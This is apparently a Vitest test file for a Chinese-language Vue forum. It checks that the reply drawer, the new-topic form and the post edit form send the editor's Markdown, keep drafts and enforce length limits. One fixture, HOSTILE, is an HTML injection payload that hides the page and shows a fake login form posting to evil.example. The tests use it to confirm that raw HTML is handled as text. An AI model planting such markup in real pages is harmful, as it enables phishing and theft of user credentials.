import type { Component } from 'vue'
import type { Post, Topic, User } from '~/data/types'
import type { TestNode } from './support/sfc'
import { afterEach, beforeAll, describe, expect, it, vi } from 'vitest'
import { defineComponent, h, nextTick, reactive, ref } from 'vue'
import * as likes from '~/data/likes'
import * as forumServer from '~/stores/forum-server'
import * as forumApi from '../shared/forum-api'
import * as postMarkdown from '../shared/post-markdown'
import { postEditorKit, StickerPickerStub } from './support/post-editor'
import { find, loadComponent, loadModule, mount, textOf } from './support/sfc'
import { loadMarked, TUFFEX_STUBS } from './support/tuffex-stubs'

/**
 * The pages that use PostEditor, mounted with their stores stubbed: the reply
 * drawer (quotes and drafts included), the new-topic form and a post's edit
 * form. What they send is the Markdown the editor last gave them, and the
 * length checks still hold. The editor is the stand-in from
 * support/post-editor.ts, loaded as Crepe would be.
 */
const { MEMBER_CONTENT_MAX } = forumApi
const { quoteDraft } = postMarkdown

const HOSTILE = '<style>*{display:none}</style><form action="https://evil.example"><input name=p><button>登录</button></form>'

const member: User = { id: 'u1', username: 'alpha', displayName: '甲', bio: '', location: '', website: '', avatarColor: '#123456', joinedAt: 0, role: 'member', notifyPrefs: { reply: true, like: true, follow: true } }
const topic: Topic = { id: 't1', slug: 'topic-1', title: '话题', categoryId: 'c1', tagIds: [], authorId: 'u1', createdAt: 0, lastActivityAt: 0, views: 1, pinned: false, closed: false }
const hostilePost: Post = { id: 'p2', topicId: 't1', authorId: 'u1', content: HOSTILE, createdAt: 0, likeUserIds: [] }
const plainPost: Post = { id: 'p3', topicId: 't1', authorId: 'u1', content: '另一条帖子', createdAt: 0, likeUserIds: [] }

let components: Record<string, Component>
const { usePostDraft } = loadModule<{ usePostDraft: unknown }>('composables/usePostDraft.ts')

/** A localStorage for usePostDraft; node has none. */
function stubStorage(initial: Record<string, string> = {}) {
  const items = new Map(Object.entries(initial))
  vi.stubGlobal('localStorage', {
    getItem: (key: string) => items.get(key) ?? null,
    setItem: (key: string, value: string) => items.set(key, value),
    removeItem: (key: string) => items.delete(key),
  })
  return items
}

beforeAll(async () => {
  await loadMarked()
  const ForumMarkdown = loadComponent('components/ForumMarkdown.vue', {
    imports: { '../../shared/post-markdown': postMarkdown },
    globals: { useStickers: () => ({ available: false, index: ref(new Map()), load: () => {} }) },
  })
  components = { ...TUFFEX_STUBS, ForumMarkdown, StickerPicker: StickerPickerStub }
})

afterEach(() => {
  vi.unstubAllGlobals()
  vi.useRealTimers()
})

async function settle() {
  await new Promise(resolve => setTimeout(resolve))
  await nextTick()
}

/** PostEditor with the Crepe stand-in; the pages mount it as their own child. */
function withEditor() {
  const kit = postEditorKit()
  const PostEditor = loadComponent('components/PostEditor.vue', { imports: kit.imports, globals: kit.globals })
  return {
    kit,
    components: { ...components, PostEditor },
    /** The editor on the page now (a new one per open of the reply drawer). */
    current: () => kit.editors.at(-1)!,
    host: (root: TestNode) => find(root, node => 'data-crepe-host' in node.props),
    type: async (markdown: string) => {
      kit.editors.at(-1)!.options.onChange(markdown)
      await nextTick()
    },
  }
}

/** A Tuffex button by its text. */
function button(root: TestNode, label: string): TestNode {
  const found = find(root, node => node.tag === 'button' && textOf(node) === label)
  if (!found)
    throw new Error(`no button ${label}`)
  return found
}

async function click(node: TestNode) {
  (node.props.onClick as () => void)()
  await settle()
}

describe('the reply drawer', () => {
  function mountComposer(props: { replyTo?: Post, quoteFrom?: Post } = {}) {
    const createPost = vi.fn(async (_input: { content: string, replyToPostId?: string }) => 'p9')
    const editor = withEditor()
    const ReplyComposer = loadComponent('components/ReplyComposer.vue', {
      imports: {
        '@talex-touch/tuffex/utils': { toast: vi.fn(), toastStore: { raised: 0 } },
        '../../shared/forum-api': forumApi,
        '../../shared/post-markdown': postMarkdown,
      },
      globals: {
        useForumStore: () => ({ userById: () => member, postById: () => undefined, postsOfTopic: () => [hostilePost, plainPost] }),
        useForumServerStore: () => ({ refusedReplies: [], takeRefusedReplies: () => [], keepRefusedReply: vi.fn() }),
        useForumActions: () => ({ createPost }),
        useContentSource: () => ({ serverMode: true }),
        useCurrentUser: () => ({ user: ref(member), can: () => true }),
        useShell: () => ({ composerOpen: ref(false) }),
        usePostDraft,
      },
    })
    // The topic page keeps the composer mounted and binds v-model:visible, :reply-to and :quote-from.
    const state = reactive<{ visible: boolean, replyTo?: Post, quoteFrom?: Post }>({ visible: false, ...props })
    const Parent = defineComponent({
      setup: () => () => h(ReplyComposer, {
        'visible': state.visible,
        topic,
        'replyTo': state.replyTo,
        'quoteFrom': state.quoteFrom,
        'onUpdate:visible': (visible: boolean) => {
          state.visible = visible
        },
      }),
    })
    const { root } = mount(Parent, {}, editor.components)
    return { root, state, createPost, editor }
  }

  it('opens empty for a plain reply, labelled 回复内容', async () => {
    stubStorage()
    const { root, state, editor } = mountComposer({ replyTo: plainPost })
    state.visible = true
    await settle()
    expect(editor.current().options.value).toBe('')
    expect(editor.host(root)?.props['aria-label']).toBe('回复内容')
  })

  // #134: someone else's text goes in as written; it renders through ForumMarkdown only once posted.
  it('opens 引用 with `> @username：` and the post\'s first line, and sends the quote plus the reply unchanged', async () => {
    stubStorage()
    const { root, state, editor, createPost } = mountComposer({ replyTo: hostilePost, quoteFrom: hostilePost })
    state.visible = true
    await settle()
    const quote = quoteDraft(hostilePost, 'alpha')
    expect(quote.startsWith('> @alpha：')).toBe(true)
    expect(editor.current().options.value).toBe(quote)
    await editor.type(`${quote}我的回复`)
    await click(button(root, '回复'))
    expect(createPost).toHaveBeenCalledOnce()
    expect(createPost.mock.calls[0]?.[0]).toMatchObject({ content: `${quote}我的回复`.trim(), replyToPostId: 'p2' })
  })

  it('adds a second quote after the draft instead of replacing it', async () => {
    stubStorage()
    const { state, editor } = mountComposer({ quoteFrom: plainPost })
    state.visible = true
    await settle()
    await editor.type('写了一半')
    state.visible = false
    await settle()
    state.quoteFrom = hostilePost
    state.visible = true
    await settle()
    expect(editor.current().options.value).toBe(`写了一半\n\n${quoteDraft(hostilePost, 'alpha')}`)
  })

  // #144: the drawer keeps its content mounted between opens; every open still gets a fresh editor.
  it('opens the next reply in a fresh editor after one was sent', async () => {
    stubStorage()
    const { root, state, editor, createPost } = mountComposer({ replyTo: hostilePost })
    state.visible = true
    await settle()
    const first = editor.current()
    await editor.type('第一条回复')
    await click(button(root, '回复'))
    expect(createPost).toHaveBeenCalledOnce()
    expect(state.visible).toBe(false)

    state.replyTo = plainPost
    state.visible = true
    await settle()
    expect(editor.current()).not.toBe(first)
    expect(first.destroyed).toBe(true)
    expect(editor.current().options.value).toBe('')
  })

  it('keeps what was typed when it is closed and opened again', async () => {
    stubStorage()
    const { root, state, editor } = mountComposer()
    state.visible = true
    await settle()
    await editor.type('写了一半')
    await click(button(root, '取消'))
    expect(state.visible).toBe(false)

    state.visible = true
    await settle()
    expect(editor.current().options.value).toBe('写了一半')
  })

  it('saves the draft in this browser every 2 seconds, puts it back next time and drops it once sent', async () => {
    vi.useFakeTimers()
    const storage = stubStorage({ 'forum:draft:t1': '上次没写完' })
    const { root, state, editor, createPost } = mountComposer()
    state.visible = true
    await vi.advanceTimersByTimeAsync(0)
    expect(editor.current().options.value).toBe('上次没写完')
    await editor.type('上次没写完，现在写完了')
    await vi.advanceTimersByTimeAsync(2000)
    expect(storage.get('forum:draft:t1')).toBe('上次没写完，现在写完了')
    ;(button(root, '回复').props.onClick as () => void)()
    await vi.advanceTimersByTimeAsync(0)
    expect(createPost).toHaveBeenCalledOnce()
    expect(storage.has('forum:draft:t1')).toBe(false)
  })

  it('sends on ⌘ + Enter from the editor', async () => {
    stubStorage()
    const { root, state, editor, createPost } = mountComposer()
    state.visible = true
    await settle()
    await editor.type('快捷键发送')
    const wrapper = find(root, node => 'data-post-editor' in node.props)!
    ;(wrapper.props.onKeydownCapture as (event: unknown) => void)({ key: 'Enter', metaKey: true, isComposing: false, preventDefault: () => {}, stopPropagation: () => {} })
    await settle()
    expect(createPost).toHaveBeenCalledOnce()
    expect(createPost.mock.calls[0]?.[0]).toMatchObject({ content: '快捷键发送' })
  })

  it('still refuses a reply over the member limit', async () => {
    stubStorage()
    const { root, state, editor, createPost } = mountComposer()
    state.visible = true
    await settle()
    await editor.type('字'.repeat(MEMBER_CONTENT_MAX + 1))
    expect(textOf(root)).toContain(`正文超过了 ${MEMBER_CONTENT_MAX} 字`)
    expect(button(root, '回复').props.disabled).toBe(true)
    await editor.type('字'.repeat(MEMBER_CONTENT_MAX))
    expect(textOf(root)).not.toContain('正文超过了')
    expect(button(root, '回复').props.disabled).toBe(false)
    await click(button(root, '回复'))
    expect(createPost).toHaveBeenCalledOnce()
  })
})

describe('the new-topic form', () => {
  function mountNewTopic() {
    const createTopic = vi.fn(async (_input: { title: string, content: string }) => 't9')
    const push = vi.fn(async () => {})
    const editor = withEditor()
    const NewTopic = loadComponent('pages/new.vue', {
      imports: {
        '@talex-touch/tuffex/utils': { toast: vi.fn() },
        '~/data/access': { UNAVAILABLE_COPY: {}, MEMBER_ONLY_COPY: { topic: '' } },
        '../../shared/forum-api': forumApi,
      },
      globals: {
        useHead: () => {},
        useRoute: () => ({ query: { category: 'help' } }),
        useRouter: () => ({ options: { history: { state: {} } }, back: vi.fn(), push }),
        useForumStore: () => ({ categoryBySlug: () => ({ id: 'c1' }), state: { categories: [], tags: [] } }),
        useForumActions: () => ({ createTopic }),
        useCurrentUser: () => ({ user: ref(member), isLoggedIn: ref(true), access: ref({ loginPrompt: null }), can: () => true, signedInReader: () => false }),
        useShell: () => ({ loginOpen: ref(false) }),
        useContentSource: () => ({ serverMode: true }),
        useSiteLinks: () => ({ signIn: vi.fn() }),
        usePostDraft,
      },
    })
    const { root } = mount(NewTopic, {}, editor.components)
    const title = () => find(root, node => node.tag === 'input')!
    return {
      root,
      createTopic,
      editor,
      setTitle: async (value: string) => {
        (title().props.onInput as (value: string) => void)(value)
        await nextTick()
      },
    }
  }

  it('writes the body in PostEditor at the 320px height, labelled 话题正文', async () => {
    stubStorage()
    const { root, editor } = mountNewTopic()
    await settle()
    const host = editor.host(root)!
    expect(host.props['aria-label']).toBe('话题正文')
    expect(String(host.props.class).split(' ')).toContain('forum-editor-320')
    expect(editor.current().options.placeholder).toBe('在这里输入内容，输入 / 打开菜单')
  })

  it('publishes the Markdown as the editor gave it, raw HTML included as text', async () => {
    stubStorage()
    const { root, editor, setTitle, createTopic } = mountNewTopic()
    await settle()
    const body = `## 小标题\n\n正文里写了 ${HOSTILE}，还有 **加粗**。`
    await setTitle('一个新话题的标题')
    await editor.type(body)
    await click(button(root, '创建话题'))
    expect(createTopic).toHaveBeenCalledOnce()
    expect(createTopic.mock.calls[0]?.[0]).toMatchObject({ title: '一个新话题的标题', content: body, categoryId: 'c1' })
  })

  it('puts back the draft this browser kept under forum:draft:new', async () => {
    stubStorage({ 'forum:draft:new': '昨天写的正文' })
    const { editor } = mountNewTopic()
    await settle()
    expect(editor.current().options.value).toBe('昨天写的正文')
  })

  it.each([
    ['shorter than 10 characters', '太短了'],
    ['longer than the member limit', '字'.repeat(MEMBER_CONTENT_MAX + 1)],
  ])('does not publish a body %s', async (_what, body) => {
    stubStorage()
    const { root, editor, setTitle, createTopic } = mountNewTopic()
    await settle()
    await setTitle('一个新话题的标题')
    await editor.type(body)
    await click(button(root, '创建话题'))
    expect(createTopic).not.toHaveBeenCalled()
  })
})

describe('the edit form on a post', () => {
  const post: Post = { id: 'p4', topicId: 't1', authorId: 'u1', content: '原来的正文 :yugc-wave:', createdAt: 0, likeUserIds: [] }

  function mountCard() {
    const editPost = vi.fn(async (_postId: string, _content: string) => true)
    const editor = withEditor()
    const PostCard = loadComponent('components/PostCard.vue', {
      imports: {
        '@talex-touch/tuffex/utils': { toast: vi.fn() },
        '~/data/account-badges': { hasTitleBadge: () => false },
        '~/data/likes': likes,
        '~/stores/forum-server': forumServer,
      },
      globals: {
        useForumStore: () => ({ userById: () => member, postById: () => undefined, isBookmarked: () => false, isFirstPost: () => false }),
        useForumActions: () => ({ editPost }),
        useCurrentUser: () => ({ user: ref(member), can: () => true }),
        useStickers: () => ({ available: false, index: ref(new Map()), load: () => {} }),
        useShell: () => ({ loginOpen: ref(false) }),
        useRelativeTime: () => ({ fromNow: () => '刚刚', formatAbsolute: () => '' }),
        useAppLink: () => ({ href: (path: string) => path, absoluteUrl: () => 'https://forum.example/t/t1#post-p4' }),
      },
    })
    const stub = defineComponent({ setup: () => () => h('div') })
    const { root } = mount(PostCard, { post, topic, floor: 2 }, { ...editor.components, UserAvatar: stub, TitleBadge: stub })
    return { root, editPost, editor }
  }

  it('starts from the post as written, with its stickers as pictures, and saves what the editor gave', async () => {
    const { root, editPost, editor } = mountCard()
    await click(button(root, '编辑'))
    expect(editor.current().options.value).toMatch(/^原来的正文 !\[挥手\]\(\/api\/forum\/stickers\/a{64}\.webp\)$/)
    await editor.type('改过的正文')
    await click(button(root, '保存'))
    expect(editPost).toHaveBeenCalledOnce()
    expect(editPost.mock.calls[0]).toEqual(['p4', '改过的正文'])
    expect(find(root, node => 'data-post-editor' in node.props)).toBeUndefined()
  })

  it('starts every edit from the post as written, not from the last abandoned one', async () => {
    const { root, editPost, editor } = mountCard()
    await click(button(root, '编辑'))
    await editor.type('不要了')
    await click(button(root, '取消'))
    await click(button(root, '编辑'))
    expect(editor.current().options.value).toMatch(/^原来的正文 /)
    expect(editPost).not.toHaveBeenCalled()
  })
})
